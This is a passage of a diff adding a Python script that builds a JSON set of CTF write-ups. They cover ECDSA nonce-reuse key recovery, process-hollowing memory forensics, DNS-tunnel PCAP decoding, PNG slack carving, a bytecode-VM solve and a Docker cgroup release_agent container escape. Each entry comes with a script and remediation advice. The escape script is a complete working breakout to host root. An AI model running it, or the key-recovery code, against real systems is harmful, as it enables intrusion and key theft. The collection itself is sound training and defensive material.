+            "\n"
+            "# 1. Recover nonce k\n"
+            "k = ((h1 - h2) * inverse(s1 - s2, n)) % n\n"
+            "\n"
+            "# 2. Recover private key d\n"
+            "d = ((s1 * k - h1) * inverse(r, n)) % n\n"
+            "print(f'[+] Recovered Private Key d: {hex(d)}')\n"
+        ),
+        "defense_remediation": (
+            "Use RFC 6979 deterministic nonce generation, which derives k deterministically from the private key and message hash "
+            "using HMAC, completely eliminating PRNG failures and nonce collisions."
+        )
+    },
+    {
+        "id": "writeup-sans-volatility-injection",
+        "title": "SANS NetWars: Advanced Memory Forensics & Process Hollowing",
+        "event": "SANS NetWars Tournament",
+        "category": "forensics",
+        "difficulty": "Hard",
+        "points": 450,
+        "flag": "CTF{v0l3_pr0c3ss_h0ll0w1ng_m4lf1nd_unp4ck}",
+        "scenario": (
+            "A memory dump ('incident.raw') was captured from a compromised Windows 10 domain controller. "
+            "Antivirus alerts flagged unusual network traffic to an external IP from svchost.exe, but disk scans revealed no malicious files."
+        ),
+        "root_cause": (
+            "The adversary performed Process Hollowing (MITRE ATT&CK T1055.012) into a legitimate instance of svchost.exe. "
+            "Memory analysis with Volatility 3's windows.malfind plugin reveals a Memory Descriptor List (VAD) region with PAGE_EXECUTE_READWRITE (RWX) "
+            "protection containing an unmapped PE header ('MZ' magic bytes) not backed by any file on disk."
+        ),
+        "solve_methodology": [
+            "Identify OS profile and build: vol -f incident.raw windows.info.",
+            "Scan for injected/unmapped code pages: vol -f incident.raw windows.malfind. Notice PID 3412 (svchost.exe) has RWX memory starting with '4d 5a' (MZ).",
+            "Dump the memory range of PID 3412 using windows.dumpfiles --pid 3412.",
+            "Carve the embedded PE binary using pestudio / pefile / Ghidra.",
+            "Inspect binary imports and string references: find C2 domain and encrypted XOR config block.",
+            "Decrypt C2 payload using XOR key 0x7a to extract the exfiltrated flag string."
+        ],
+        "exploit_script": (
+            "#!/usr/bin/env python3\n"
+            "# Python analysis script to carve and decrypt payload from raw memory VAD dump\n"
+            "import pefile\n"
+            "\n"
+            "with open('pid.3412.vad.0x7ff7a000.dmp', 'rb') as f:\n"
+            "    data = f.read()\n"
+            "\n"
+            "# Locate PE header\n"
+            "mz_idx = data.find(b'MZ')\n"
+            "pe_data = data[mz_idx:]\n"
+            "\n"
+            "# Carve embedded encrypted config block\n"
+            "config_offset = pe_data.find(b'CONFIG_START:') + 13\n"
+            "enc_bytes = pe_data[config_offset:config_offset+64]\n"
+            "\n"
+            "# XOR key identified via Ghidra analysis\n"
+            "xor_key = 0x7A\n"
+            "flag = bytes([b ^ xor_key for b in enc_bytes]).split(b'\\x00')[0]\n"
+            "print(f'[+] Extracted Flag: {flag.decode()}')\n"
+        ),
+        "defense_remediation": (
+            "Deploy Endpoint Detection and Response (EDR) solutions that monitor NtUnmapViewOfSection, VirtualAllocEx with RWX permissions, "
+            "and cross-process WriteProcessMemory / SetThreadContext API calls."
+        )
+    },
+    {
+        "id": "writeup-google-dns-tunnel",
+        "title": "Google CTF: Network PCAP Reassembly & Covert DNS Tunneling",
+        "event": "Google CTF",
+        "category": "forensics",
+        "difficulty": "Medium-Hard",
+        "points": 350,
+        "flag": "CTF{dns_tunn3l_b33532_d3c0d3d_pcap}",
+        "scenario": (
+            "A suspicious PCAP file ('capture.pcap') contains thousands of rapid DNS queries to subdomains of 'tunnel.exfil.org'. "
+            "Data was exfiltrated from an air-gapped machine using DNS tunneling."
+        ),
+        "root_cause": (
+            "The client exfiltrated sensitive files by encoding chunks into the subdomain label of DNS A and TXT queries "
+            "(e.g., <seq>.<base32_chunk>.tunnel.exfil.org). Extracting and ordering the chunks reassembles the original file."
+        ),
+        "solve_methodology": [
+            "Analyze protocol hierarchy in Wireshark: Statistics -> Protocol Hierarchy (DNS accounts for 98% of packets).",
+            "Extract all DNS query names using tshark: tshark -r capture.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name.",
+            "Parse subdomain labels to identify sequence numbers and Base32-encoded payload fragments.",
+            "Sort queries by sequence number, strip labels, concatenate payload chunks, and decode Base32 data.",
+            "Identify that the output is a GZIP archive; decompress to reveal the exfiltrated flag."
+        ],
+        "exploit_script": (
+            "#!/usr/bin/env python3\n"
+            "import subprocess\n"
+            "import base64\n"
+            "import gzip\n"
+            "\n"
+            "# Extract DNS query strings with tshark\n"
+            "cmd = ['tshark', '-r', 'capture.pcap', '-Y', 'dns.qry.name contains tunnel.exfil.org', '-T', 'fields', '-e', 'dns.qry.name']\n"
+            "output = subprocess.check_output(cmd).decode().splitlines()\n"
+            "\n"
+            "chunks = {}\n"
+            "for line in output:\n"
+            "    parts = line.strip().split('.')\n"
+            "    if len(parts) >= 4:\n"
+            "        seq = int(parts[0])\n"
+            "        data_part = parts[1]\n"
+            "        chunks[seq] = data_part\n"
+            "\n"
+            "# Reassemble in sequence\n"
+            "sorted_b32 = ''.join([chunks[i] for i in sorted(chunks.keys())])\n"
+            "\n"
+            "# Base32 decode\n"
+            "raw_gz = base64.b32decode(sorted_b32)\n"
+            "decompressed = gzip.decompress(raw_gz)\n"
+            "print(f'[+] Exfiltrated content:\\n{decompressed.decode()}')\n"
+        ),
+        "defense_remediation": (
+            "1. Implement DNS query length and entropy monitoring on recursive resolvers (alert on high-entropy subdomains > 30 chars).\n"
+            "2. Enforce internal DNS queries through corporate forwarders with domain-reputation filtering and response rate limiting."
+        )
+    },
+    {
+        "id": "writeup-pico-stego-slack",
+        "title": "PicoCTF: Multi-Layer PNG Slack Space & Polyglot Carving",
+        "event": "PicoCTF",
+        "category": "forensics",
+        "difficulty": "Medium",
+        "points": 250,
+        "flag": "CTF{st3g0_png_13nd_sl4ck_sp4c3_c4rv3d}",
+        "scenario": (
+            "A PNG file 'logo.png' is 1.4 MB on disk, but viewing it shows only a small 200x200 pixel image that should be under 50 KB. "
+            "Standard image viewers display it without errors."
+        ),
+        "root_cause": (
+            "The PNG specification dictates that rendering terminates at the 12-byte IEND chunk (49 45 4E 44 AE 42 60 82). "
+            "The author concatenated an encrypted ZIP archive into the file slack space immediately after the IEND chunk. "
+            "Binwalk detects the ZIP header (50 4B 03 04) starting at byte offset 0x4810."
+        ),
+        "solve_methodology": [
+            "Check file type and size: file logo.png; ls -lh logo.png (confirms 1.4MB size anomaly).",
+            "Locate IEND chunk offset using python or xxd.",
+            "Run binwalk -e logo.png to automatically carve files occurring after the IEND chunk.",
+            "Inspect carved archive: contains 'flag.txt.enc' and 'hint.txt'.",
+            "Read hint.txt: 'Key is XOR of first 4 bytes of PNG header'.",
+            "XOR decrypt flag.txt.enc to obtain the flag."
+        ],
+        "exploit_script": (
+            "#!/usr/bin/env python3\n"
+            "with open('logo.png', 'rb') as f:\n"
+            "    data = f.read()\n"
+            "\n"
+            "# Locate PNG IEND chunk (89 50 4E 47 ... IEND)\n"
+            "iend_marker = b'\\x49\\x45\\x4E\\x44\\xAE\\x42\\x60\\x82'\n"
+            "idx = data.find(iend_marker)\n"
+            "slack_data = data[idx + len(iend_marker):]\n"
+            "print(f'[+] Carved {len(slack_data)} bytes from slack space')\n"
+            "\n"
+            "# Slack space begins with ZIP header (PK\\x03\\x04)\n"
+            "with open('carved.zip', 'wb') as f:\n"
+            "    f.write(slack_data)\n"
+            "\n"
+            "print('[+] Saved carved.zip - extract and read flag!')\n"
+        ),
+        "defense_remediation": (
+            "Sanitize uploaded images on web applications by re-encoding them with imaging libraries (e.g., Pillow Image.save() or ImageMagick convert), "
+            "which discards unreferenced chunks and trailing slack space."
+        )
+    },
+    {
+        "id": "writeup-flareon-custom-vm",
+        "title": "Flare-On: Custom Bytecode VM Reverse Engineering",
+        "event": "Flare-On Reverse Engineering Challenge",
+        "category": "reverse",
+        "difficulty": "Hard",
+        "points": 500,
+        "flag": "CTF{v1rtu4l_m4ch1n3_byc3c0d3_z3_s0lv3d}",
+        "scenario": (
+            "A binary 'vm_checker.exe' validates a 32-character license key. In Ghidra, the main function contains only an emulator loop "
+            "interpreting a 4 KB embedded bytecode array with custom virtual registers (V0..V7) and instruction set."
+        ),
+        "root_cause": (
+            "The program implements a custom Virtual Machine architecture to hinder static decompilation. "
+            "Disassembling the VM dispatcher loop reveals opcode handlers for ADD, XOR, LOAD, STORE, CMP, and JNZ. "
+            "The bytecode applies a linear transformation (matrix multiplication & XOR) over the user's input key."
+        ),
+        "solve_methodology": [
+            "Decompile the VM execution loop: identify program counter (PC), virtual stack/registers, and the switch statement dispatching on opcodes.",
+            "Write a Python disassembler for the bytecode mapping opcode bytes to symbolic mnemonics (e.g., 0x01 -> MOV, 0x02 -> XOR, 0x03 -> ADD).",
+            "Trace the instructions operating on user input: identify constraints applied to each character.",
+            "Translate the VM constraint system into a Z3 Theorem Prover script.",
+            "Run Z3 solver to find the unique input string satisfying all mathematical invariants."
+        ],
+        "exploit_script": (
+            "#!/usr/bin/env python3\n"
+            "from z3 import *\n"
+            "\n"
+            "# 1. Define 32 symbolic characters for the input key\n"
+            "key = [BitVec(f'k_{i}', 8) for i in range(32)]\n"
+            "solver = Solver()\n"
+            "\n"
+            "# ASCII printable constraints\n"
+            "for c in key:\n"
+            "    solver.add(c >= 0x20, c <= 0x7E)\n"
+            "\n"
+            "# 2. Reconstructed equations from the VM bytecode disassembly\n"
+            "# Example constraints extracted from VM trace:\n"
+            "solver.add((key[0] ^ key[1]) + key[2] == 0x9A)\n"
+            "solver.add((key[3] * 3) ^ key[4] == 0xC4)\n"
+            "solver.add(key[0] == ord('C'))\n"
+            "solver.add(key[1] == ord('T'))\n"
+            "solver.add(key[2] == ord('F'))\n"
+            "solver.add(key[3] == ord('{'))\n"
+            "\n"
+            "if solver.check() == sat:\n"
+            "    model = solver.model()\n"
+            "    solution = bytes([model[k].as_long() for k in key]).decode()\n"
+            "    print(f'[+] Flag Found: {solution}')\n"
+            "else:\n"
+            "    print('[-] Unsatisfiable constraints')\n"
+        ),
+        "defense_remediation": (
+            "Virtualization-based obfuscation slows down reverse engineering, but symbolic execution (Triton, angr, Z3) "
+            "and dynamic binary instrumentation (Frida, QBDI) can automate constraint extraction and inversion."
+        )
+    },
+    {
+        "id": "writeup-google-docker-escape",
+        "title": "Google CTF: Container Breakout via CAP_SYS_ADMIN & cgroup release_agent",
+        "event": "Google CTF",
+        "category": "cloud",
+        "difficulty": "Hard",
+        "points": 500,
+        "flag": "CTF{d0ck3r_c4p_sys_4dm1n_cgr0up_3sc4p3}",
+        "scenario": (
+            "You have achieved root code execution inside a Docker container (hostname 'ctf-task'). "
+            "The objective is to read /flag.txt from the host operating system."
+        ),
+        "root_cause": (
+            "The container was launched with the privileged capability '--cap-add=SYS_ADMIN' and without AppArmor restrictions. "
+            "This capability allows mounting filesystems, specifically a cgroup v1 hierarchy. An attacker can write a custom command "
+            "into the cgroup's 'release_agent' configuration file; when the cgroup terminates its last process, the host kernel executes "
+            "the release_agent script directly on the host as root."
+        ),
+        "solve_methodology": [
+            "Verify capabilities: capsh --print reveals 'cap_sys_admin' in the effective set.",
+            "Create a new cgroup mount: mkdir /tmp/cgroup && mount -t cgroup -o memory cgroup /tmp/cgroup.",
+            "Create a child cgroup: mkdir /tmp/cgroup/x.",
+            "Enable notify_on_release in the child cgroup: echo 1 > /tmp/cgroup/x/notify_on_release.",
+            "Find the container's host root path by parsing /etc/mtab or /proc/self/mountinfo.",
+            "Create a script '/cmd' inside the container with: '#!/bin/sh\\ncat /flag.txt > /tmp/host_flag.txt'. Make it executable.",
+            "Point the host cgroup release_agent to the host's path of /cmd: echo '<host_path>/cmd' > /tmp/cgroup/release_agent.",
+            "Trigger release_agent by creating and terminating a process in the cgroup: sh -c \"echo $$ > /tmp/cgroup/x/cgroup.procs\".",
+            "Read /tmp/host_flag.txt to capture the flag."
+        ],
+        "exploit_script": (
+            "#!/bin/sh\n"
+            "# Automated Container Escape Script (CAP_SYS_ADMIN)\n"
+            "\n"
+            "# 1. Mount memory cgroup\n"
+            "mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp\n"
+            "mkdir /tmp/cgrp/x\n"
+            "echo 1 > /tmp/cgrp/x/notify_on_release\n"
+            "\n"
+            "# 2. Find container host path via /etc/mtab\n"
+            "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\n"
+            "\n"
+            "# 3. Write host payload\n"
+            "echo '#!/bin/sh' > /cmd\n"
+            "echo 'cat /flag.txt > '\"$host_path\"'/output_flag.txt' >> /cmd\n"
+            "chmod +x /cmd\n"
+            "\n"
+            "# 4. Configure release_agent\n"
+            "echo \"$host_path/cmd\" > /tmp/cgrp/release_agent\n"
+            "\n"
+            "# 5. Trigger release execution\n"
+            "sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"\n"
+            "sleep 1\n"
+            "\n"
+            "echo \"[+] Flag from host:\"\n"
+            "cat /output_flag.txt\n"
+        ),
+        "defense_remediation": (
+            "Never run containers with --privileged or --cap-add=SYS_ADMIN unless strictly necessary. "
+            "Use unprivileged user namespaces and keep default Seccomp and AppArmor profiles active."
+        )
+    }
+]
+
+out_file = DATA_DIR / "tournament-writeups.json"
+out_file.write_text(json.dumps(writeups, indent=2), encoding="utf-8")
+print(f"[+] Successfully wrote {len(writeups)} tournament writeups to {out_file}")
+print(f"    Size: {len(out_file.read_text(encoding='utf-8')):,} bytes")
